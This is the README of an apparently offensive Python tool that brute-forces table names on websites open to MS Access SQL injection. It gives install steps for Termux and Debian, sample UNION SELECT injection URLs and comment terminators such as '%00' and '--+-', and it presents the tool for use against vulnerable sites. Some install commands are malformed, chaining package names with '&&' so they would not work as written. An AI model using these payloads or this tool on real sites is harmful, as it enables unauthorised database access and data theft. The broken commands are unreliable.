## MsAccessMonster
A fast tool for bruteforcing the Ms Access SQL Injection vulnerable sites with 3k+ possible table names.

### Compatible devices
- As this is a python tool, it will run in all devices Termux and Debian based OS.

### Installation & running process
- For Termux ( Android )
```
pkg update && pkg upgrade -y
```
```
pkg install git && python3
```
```
pip install requests
```
```
git clone https://github.com/EverythingVulnerable/MsAccessMonster
```
- For Debian based OS
```
sudo su
```
```
apt-get update && apt upgrade -y
```
```
apt-get install python3 && python3-pip && git
```
```
git clone https://github.com/EverythingVulnerable/MsAccessMonster
```

### Running commands ( for every device )
```
cd MsAccessMonster
```
```
python3 ms.py
```
Then, you will be asked for a Ms Access Vulnerable Site. Give it like this,
```
https://www.everythingvuln1.com/vuln.php?id=1 and 0 union select 1,2,3,4 from
```
Or,
```
https://www.everythingvuln1.com/vuln.php?id=1'and 0 union select 1,2,3,4 from
```
Then, you will be asked to give the comment of the query. This can be anything. Depends on the website. Such as,

```
--
--+-
%00
;%00
```
Give the perfect comment and hit enter and wait for the response.
```
[$] Site link: https://www.everythingvuln1.com/vuln.php?id=1 and 0 union select 1,2,3,4 from ..... %00
```
